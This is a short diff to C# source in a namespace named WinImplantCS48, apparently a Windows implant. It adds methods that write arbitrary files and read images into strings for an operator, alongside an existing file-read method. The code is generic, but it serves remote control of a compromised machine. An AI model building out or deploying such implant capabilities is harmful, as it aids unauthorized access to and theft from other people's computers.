@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Text;
@@ -84,6 +85,32 @@ namespace WinImplantCS48
             try
             {
                 return (1, File.ReadAllText(szFilePath));
+            }
+            catch (Exception ex)
+            {
+                return (0, ex.Message);
+            }
+        }
+
+        public (int nCode, string szContent) fnWriteFile(string szFilePath, string szFileContent)
+        {
+            try
+            {
+                File.WriteAllText(szFilePath, szFileContent);
+                return (1, szFilePath);
+            }
+            catch (Exception ex)
+            {
+                return (0, ex.Message);
+            }
+        }
+
+        public (int nCode, string szMsg) fnReadImage(string szFilePath)
+        {
+            try
+            {
+                Image image = Image.FromFile(szFilePath);
+                return (1, clsTools.fnszImageToString(image));
             }
             catch (Exception ex)
             {
